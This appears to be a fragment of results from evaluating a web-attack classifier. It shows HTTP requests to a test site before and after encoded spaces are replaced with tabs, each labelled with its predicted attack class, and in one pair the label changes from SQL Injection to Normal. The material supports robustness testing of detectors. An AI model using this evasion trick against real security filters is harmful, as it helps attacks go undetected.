  - önce: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=soluti`
  - sonra: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=soluti`
- **Protocol Manipulation** (tahmin: Protocol Manipulation → Protocol Manipulation)
  - önce: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
  - sonra: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: ` /blog/c%253A%252F/my-account/edit-profile/%7B%7B%20data.editLink%20%7D%7D&image-editor HTTP/1.1 Host: test-site.com U`
  - sonra: ` /blog/c%253A%252F/my-account/edit-profile/%7B%7B%09data.editLink%09%7D%7D&image-editor HTTP/1.1 Host: test-site.com U`
- **SQL Injection** (tahmin: SQL Injection → Normal)
  - önce: `GET /blog/%252F/my-account/edit-profile/%7B%7B%20data.model.url HTTP/1.1 Host: test-site.com User-A`
  - sonra: `GET /blog/%252F/my-account/edit-profile/%7B%7B%09data.model.url HTTP/1.1 Host: test-site.com User-A`

